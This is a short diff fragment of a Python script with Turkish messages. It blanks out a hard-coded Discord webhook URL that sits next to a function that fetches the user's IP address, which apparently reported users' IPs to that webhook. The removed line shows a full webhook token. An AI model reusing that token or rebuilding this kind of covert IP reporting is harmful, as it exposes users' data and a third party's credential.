@@ -56,7 +56,7 @@ try:
             print(f"Error getting user's IP: {e}")
             return None
 
-    discord_webhook_url = 'https://discord.com/api/webhooks/1172278677212504164/pmXy6YhwPhFSQvjT8rkP0p83eRRxBUwgHnQW-ToBiuXNxYyGqmtQ_xkaCyEZulTvY79D'
+    discord_webhook_url = ''
     def bulucu(u):
         try:
             try:
@@ -156,4 +156,5 @@ try:
 
 except KeyboardInterrupt:
     print(Y + "\nİptal edildi! İyi günler :)" + W)
+
 
